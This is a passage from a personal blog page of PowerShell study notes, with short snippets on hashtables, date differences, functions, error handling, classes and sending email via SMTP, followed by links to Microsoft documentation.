</span></span><span style="display:flex;"><span><span style="color:#75715e"># disctionary, not {} instead of ()</span>
</span></span><span style="display:flex;"><span>$hash_table = @{
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;127.0.0.1&#34;</span> = <span style="color:#e6db74">&#34;localhost&#34;</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;192.168.1.1&#34;</span> = <span style="color:#e6db74">&#34;router1&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	
</span></span></code></pre></div><h3 id="timestamps">Timestamps</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Find diff between today and some point in time</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Method 1</span>
</span></span><span style="display:flex;"><span>$emp_date = [<span style="color:#66d9ef">string</span>]$emp_data[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">-replace</span> <span style="color:#e6db74">&#34;-&#34;</span>, <span style="color:#e6db74">&#34;/&#34;</span>;
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">datetime</span>]$emp_date += <span style="color:#e6db74">&#34; 00:00&#34;</span>;
</span></span><span style="display:flex;"><span>$diff = NEW-TIMESPAN <span style="color:#960050;background-color:#1e0010">‚Äì</span>Start $emp_date <span style="color:#960050;background-color:#1e0010">‚Äì</span><span style="color:#66d9ef">End</span> $today
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($diff <span style="color:#f92672">-ge</span> <span style="color:#ae81ff">365</span>*<span style="color:#ae81ff">5</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># do something</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Method 2</span>
</span></span><span style="display:flex;"><span>$emp_date = $emp_data[<span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>$DOJ=[<span style="color:#66d9ef">datetime</span>]::ParseExact($date, <span style="color:#e6db74">&#34;yyyy-mm-dd&#34;</span>, $null)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($DOJ <span style="color:#f92672">-le</span> (Get-Date).AddYears(<span style="color:#ae81ff">-5</span>)  ){
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># do something</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="functions">Functions</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># unnamed local arg</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> Hello-World {
</span></span><span style="display:flex;"><span>	echo $args[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># do something</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Hello-World <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># prints 1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># named local arg</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> Hello-World($names){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">foreach</span> $name <span style="color:#66d9ef">in</span> $names{
</span></span><span style="display:flex;"><span>		echo <span style="color:#e6db74">&#34;hello&#34;</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$names = @(<span style="color:#e6db74">&#34;Jessica&#34;</span>, <span style="color:#e6db74">&#34;Mark&#34;</span>, <span style="color:#e6db74">&#34;Jason&#34;</span>)
</span></span><span style="display:flex;"><span>Hello-World $names
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># parameters ++++</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> Hello-World-Remastered{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">param</span>
</span></span><span style="display:flex;"><span>	(
</span></span><span style="display:flex;"><span>		[<span style="color:#66d9ef">string</span>]Name,
</span></span><span style="display:flex;"><span>		[<span style="color:#66d9ef">int</span>]age,
</span></span><span style="display:flex;"><span>		[<span style="color:#66d9ef">bool</span>]agree = <span style="color:#ae81ff">1</span> <span style="color:#75715e"># default value</span>
</span></span><span style="display:flex;"><span>	)
</span></span><span style="display:flex;"><span>	Write-Output <span style="color:#e6db74">&#34;Hello, </span>$Name<span style="color:#e6db74"> who is </span>$age<span style="color:#e6db74"> old! You said </span>$agree<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Hello-World-Remastered -Name Tariel -age <span style="color:#ae81ff">21</span> -agree <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><h3 id="error-handling">Error Handling</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-Content <span style="color:#e6db74">&#34;file&#34;</span> -ErrorAction [Stop|SilentlyContinue] -ErrorVariable $err
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>{
</span></span><span style="display:flex;"><span>	Get-Help <span style="color:#e6db74">&#34;Something&#34;</span> -ErrorAction Stop -ErrorVariable $error
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">catch</span> [<span style="color:#66d9ef">System.IO.FileNotFoundException</span>]{
</span></span><span style="display:flex;"><span>	$ErrorMessage = $_.Exception.Message
</span></span><span style="display:flex;"><span>	$ErrorMessage
</span></span><span style="display:flex;"><span>	Write-Output <span style="color:#e6db74">&#34;Error caught </span>$ErrorMessage<span style="color:#e6db74">&#34;</span> -Foreground Yellow
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="classes">Classes</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> Cat {
</span></span><span style="display:flex;"><span>	[<span style="color:#66d9ef">int32</span>] age;
</span></span><span style="display:flex;"><span>	[<span style="color:#66d9ef">String</span>] name;
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	[<span style="color:#66d9ef">int32</span>] number_of_kittens () {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="emails">Emails</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># create a Mail object</span>
</span></span><span style="display:flex;"><span>$message = New-Object System.Net.Mail.MailMessage
</span></span><span style="display:flex;"><span>$message.body = <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>$message.subject = $subject
</span></span><span style="display:flex;"><span>$message.to.add($to)
</span></span><span style="display:flex;"><span>$message.from = $from
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># create a SMPT client</span>
</span></span><span style="display:flex;"><span>$SMTPServer = <span style="color:#e6db74">&#34;smtp.gmail.com&#34;</span>
</span></span><span style="display:flex;"><span>$SMTPPort = <span style="color:#ae81ff">465</span>
</span></span><span style="display:flex;"><span>$smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Provide creds if needed</span>
</span></span><span style="display:flex;"><span>$smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># use SSL in case you fancy it or if the server requires </span>
</span></span><span style="display:flex;"><span>$smtp.EnableSSL = $true
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># send the message</span>
</span></span><span style="display:flex;"><span>$smtp.send($message)
</span></span></code></pre></div><h2 id="references">References</h2>
<p>[<a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/07-working-with-wmi?view=powershell-7.1">1</a>] WMI and CIM docs</p>
<p>[<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies">2</a>] PowerShell execution policies for scripts</p>

  </div>
</article>
</div>
</div>

        </div>
      </div>
    </div>
    
  </div>

  <div class="sub-footer">
  <div class="container">
    <div class="row">
      <div class="col-12">
        <div class="sub-footer-inner">
          <ul>
            <li class="zerostatic"><a href="https://www.zerostatic.io">www.zerostatic.io</a></li>
            </ul>
        </div>
      </div>
    </div>
  </div>
</div>

  

  
  

  
  <script type="text/javascript" src="/js/scripts.min.ec19db7e4836c12e2c5e3697d926bc3e4c22005167d9826aab54feca08f0c093.js"></script>
  

  
  
  
    
  


</body>

</html>
